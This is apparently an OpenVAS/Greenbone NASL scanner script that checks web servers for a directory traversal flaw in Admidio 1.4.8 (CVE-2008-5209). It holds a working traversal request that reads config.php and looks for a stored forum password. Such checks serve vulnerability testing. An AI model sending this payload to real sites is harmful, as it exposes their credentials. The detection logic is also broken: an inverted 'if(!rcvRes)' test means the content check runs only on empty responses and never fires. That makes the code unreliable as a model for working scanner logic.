if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.800309" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2008-12-01 15:31:19 +0100 (Mon, 01 Dec 2008)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_cve_id( "CVE-2008-5209" );
	script_bugtraq_id( 29127 );
	script_name( "Admidio get_file.php Remote File Disclosure Vulnerability" );
	script_xref( name: "URL", value: "http://www.milw0rm.com/exploits/5575" );
	script_xref( name: "URL", value: "http://www.admidio.org/forum/viewtopic.php?t=1180" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2008 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "Successful exploitation could allow attacker to view local files in the
  context of the webserver process." );
	script_tag( name: "affected", value: "Admidio Version 1.4.8 and prior." );
	script_tag( name: "insight", value: "The flaw is due to file parameter in modules/download/get_file.php
  which is not properly sanitized before returning to the user." );
	script_tag( name: "solution", value: "Upgrade to Version 1.4.9 or later." );
	script_tag( name: "summary", value: "This host is running Admidio and is prone to Directory Traversal
  Vulnerability." );
	script_tag( name: "qod_type", value: "remote_app" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
for path in nasl_make_list_unique( "/admidio", http_cgi_dirs( port: port ) ) {
	if(path == "/"){
		path = "";
	}
	rcvRes = http_get_cache( item: NASLString( path, "/adm_program/index.php" ), port: port );
	if(!rcvRes){
		if(ContainsString( rcvRes, "Admidio Team" )){
			dirTra = "/adm_program/modules/download/get_file.php?folder=&file=../../adm_config/config.php&default_folder=";
			sndReq = http_get( item: NASLString( path, dirTra ), port: port );
			rcvRes = http_keepalive_send_recv( port: port, data: sndReq, bodyonly: TRUE );
			if(!rcvRes){
				continue;
			}
			if(ContainsString( rcvRes, "Module-Owner" ) && ContainsString( rcvRes, "$g_forum_pw" )){
				security_message( port );
				exit( 0 );
			}
		}
	}
}
exit( 99 );

